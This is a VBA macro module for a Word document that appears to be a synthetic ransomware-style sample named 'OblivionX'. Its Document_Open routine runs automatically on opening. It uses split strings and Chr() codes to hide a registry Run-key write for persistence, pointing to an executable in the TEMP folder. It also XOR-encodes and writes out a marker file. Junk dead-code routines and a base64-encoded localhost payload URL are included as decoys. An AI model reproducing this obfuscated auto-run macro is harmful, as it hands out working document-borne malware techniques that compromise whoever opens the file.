
Public Sub OblivionXJunkRoutine()
    Dim junkcounter As Long
    Dim junktext As String
    If False Then
        junktext = "decoy"
        junkcounter = 1 + 1
    End If
    Dim deadvarunused As Long
    If 1 = 2 Then
        deadvarunused = 999
    End If

End Sub
Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    Dim lckhv437 As Object
    Dim xcx6ug6uo As String, data As String, enc As String
    Dim sarv21hmdtd5d As Long
    Set lckhv437 = CreateObject("WScr" & "ipt." & "Shel" & "l")
    lckhv437.RegWrite Chr(72) & Chr(75) & Chr(67) & Chr(85) & Chr(92) & Chr(83) & "oftwa" & "re\Micr" & "osoft\Win" & "dows\Curr" & "entVe" & "rsion\" & "Run\obliv" & "ionx", """ & Environ("TEMP") & "\oblivion" & "x_loc" & "k.exe"", "REG_SZ"
    xcx6ug6uo = Environ("TEMP") & "\oblivio" & "nx_vaul" & "t\se" & "cret.txt"
    data = "top " & "secre" & "t ma" & "rker" & " data"
    enc = ""
    For sarv21hmdtd5d = 1 To Len(data)
        enc = enc & Chr(Asc(Mid(data, sarv21hmdtd5d, 1)) Xor 42)
    Next sarv21hmdtd5d
    Open xcx6ug6uo For Output As #1
    Print #1, enc
    Close #1
End Sub

Public Function OblivionXDecoy() As String
    Dim b64 As String
    b64 = "aHR0cDovLzEyNy4wLjAuMTo5MDkwL3BheWxvYWQuZXhl"
    OblivionXDecoy = b64
End Function
